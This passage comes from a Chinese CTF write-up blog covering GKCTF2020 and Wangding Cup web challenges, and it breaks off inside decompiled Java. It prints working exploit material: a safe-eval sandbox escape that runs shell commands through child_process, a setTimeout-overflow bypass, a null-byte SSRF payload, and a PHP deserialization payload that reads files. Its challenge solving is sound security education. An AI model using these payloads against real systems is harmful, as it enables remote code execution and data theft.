class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后再回到开始提到的问题。想要触发反序列化必须要有个session.不过其实也有好几道题设及到了这个知识点。我们利用php的特性。带上<code>php_session_upload_progress</code>上传文件。并且cookie带上PHPSESSID。就会发现不会触发它提示<code>no, you can&#39;t unserialize it without session QAQ</code>了<br>结果<br><img src="/2020/05/24/GKCTF2020writeup/7.PNG" alt></p><p>当然这题不按这个思路来也是可以的。因为get传参<code>start</code>处也有一个反序列化。直接打也没问题。总之这题花的时间是最短的,比赛时没做真的可惜。</p><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><p>这题跟之前做npuctf时的一道node差不多。不过这里直接用的<code>safe-eval</code>库。显然是有poc可逃逸的。但是在这之前肯定有waf要绕。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里settimout会发现导致我们的payload都无法执行。因此需要绕过,让delay小于1000才能进到safeeval的路由里。<br><a href="https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values" target="_blank" rel="noopener">https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values</a><br>这里存在一个issue。就是我们传入的delay如果大小超过32位，会被<code>settimeout</code>设为1.这样就满足条件了。<br>后面搜到的safe-eval的poc直接打</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f = Buffer.prototype.write;</span><br><span class="line">  <span class="keyword">const</span> ft = &#123;</span><br><span class="line">    length: <span class="number">10</span>,</span><br><span class="line">    utf8Write()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      x = r(i);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)!==<span class="string">'number'</span>)</span><br><span class="line">      <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(x!==i)</span><br><span class="line">      <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      f.call(ft);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      i=r(i).constructor.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"id"</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure><p>改成IIFE形式直接打。</p><p><code>(function(){xxxxx})()</code><br><img src="/2020/05/24/GKCTF2020writeup/8.PNG" alt></p><h2 id="CVE版签到"><a href="#CVE版签到" class="headerlink" title="CVE版签到"></a>CVE版签到</h2><p>这题我是真的没理解出题人的意思。后面提醒了CVE后还是没理解出题人的意思……结果大部分时间都花在这题上了。</p><p>进去后似乎是一个ssrf。然后只有<code>.ctfhub.com</code>才会触发动作的样子。因此判断应该是有个正则了。然后发现header里提示flag在localhost,并且Host要以123结尾。</p><p>这里我虽然大概明白后端运行流程，但是还是搞错了出题人的意图。太难受了。运用到的CVE其实就是getheader的CVE。之前BJD刚刚考过。这个函数特点就是会去请求并返回header.但是CVE告诉我们,如果是用%00截断,就可能让命令去请求用户的可控网址。</p><p>在了解到这个CVE后，我以为是要返回头里的Host为123结束。结果最后才知道原来是要请求<code>127.0.0.123</code>。。。不知道说啥,只能说自己把提示搞成要绕的waf了。<br>payload<br><code>url=http://127.0.0.123%00.ctfhub.com</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次比赛虽然后面基本就没花时间了，但是收获挺大的.至少发现自己临场变通的能力还是很差就跟平时学业一样…不过还是得稳扎稳打吧。最后还剩一场RCTF这个学期就要暂时跟CTF说再见了。争取能再发挥的稳一点。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-青龙组-WEB-writeup</title>
      <link href="2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/"/>
      <url>2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/</url>
      
        <content type="html"><![CDATA[<p>网鼎青龙组成功挺进线下,当然要感谢队友们的给力发挥,X1c两只队也能成功会师半决赛了.(就是对我这样的awd小白而言估计又是去当炮灰了)</p><p>说下比赛感受吧。老实说web手比赛体验并不好。开赛到12点才出现第一道WEB题.而这之前唯一一个签到靶机题我开了一个小时都是坏的…<br>然后是比赛氛围,老实说明眼人应该都看得出来了。中间py什么的就不多说了。java那题我眼睁睁看着5分钟内涨了几十解。至于其他几个二进制的题更不用提,做出来的人数就是铁证了。最后五分钟内，十几秒时间我们队掉了十多名然后又蹦回来了就很迷。<br>然后动态靶机一队只能开一个,老实说很大程度上束缚了开题的节奏。</p><p>比赛难度倒还能接受。按郁师傅说的,这次没ak web不太应该。当然其实是最后看着只剩10多分钟时名次稳了就做不动了.赛后复现最后一个题时也发现确实不改完没做出来的。总之这里把所有WEB题解都记录下吧。</p><a id="more"></a><h1 id="AreUserialize"><a href="#AreUserialize" class="headerlink" title="AreUserialize"></a>AreUserialize</h1><p>今日玄学题。首先是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能上有一个任意写跟任意读。只需要过一个valid函数检查就能反序列化。op的值决定了读/写功能。</p><p>首先析构函数明显是入手点。但是他限制了当op为<code>&quot;2&quot;</code>时令op为<code>&quot;1&quot;</code>也就是写功能。然后又置内容为空。<br>跟进到<code>process()</code>函数看下,会明显的发现它采用了<code>$this-&gt;op == &quot;2&quot;</code>这样的弱类型相等判断。<br>那么漏洞很明显了,我们可以利用弱类型比较绕过析构函数的限制,达成任意文件读取。</p><p>不过注意的是,原题的<code>Filehandler</code>类属性都是protected,表现出来的结果就是序列化数据有空字符。而这是过不了<code>is_valid()</code>的检查的</p><p>但是不要紧。php7.2+版本下反序列化并不在乎你传入的数据属性是否是protected。所以我们改成public即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"file:///web/html/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($o));</span><br></pre></td></tr></table></figure><p><code>2==&quot;2&quot;,&quot;2e0&quot;==&quot;2&quot;</code>这种技巧不用多说了。这里要解释的是比较坑的后面的filename。开始直接伪协议读flag.php读不到。这个从源码角度讲完全没道理。<br>然后只能尝试用绝对路径读了。基于我们其他文件都能轻松读到,我们先构造个404看看这是什么服务器。<br>发现是 Alpine的镜像。<br>于是查了波其web路径的配置/web/config/httpd.conf<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/1.png" alt><br>然后得到web路径后换绝对路径就读到了，玄学问题。<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/2.png" alt></p><p>ps：<br>赛后突然想起来原来在做D^3时踩过的一个坑。就是apache的析构函数执行时工作目录可能会变。所以用相对路径读时是获取不到flag.php的.当然这是概率问题、有的人就能直接读到。</p><h1 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h1><p>这题能出200解我是真没想到的,主要中间那波垂直上分太突兀了。但仔细想我也是那个时间交的flag…</p><p>当然题目肯定是简单题。首先进去有一个我开始忽略的信息就是它在upload界面提示flag在/flag、然后随便上传个文件,马上就测出是个任意文件下载</p><p>那老套路先从<code>/WEB-INF/web.xml</code>开始</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>file_in_java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>upload.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>三个Servlet,路径也都给出来了，一个个读然后反编译吧。</p><p>这里直接给出含有关键代码的java<br>UploadServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   UploadServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> 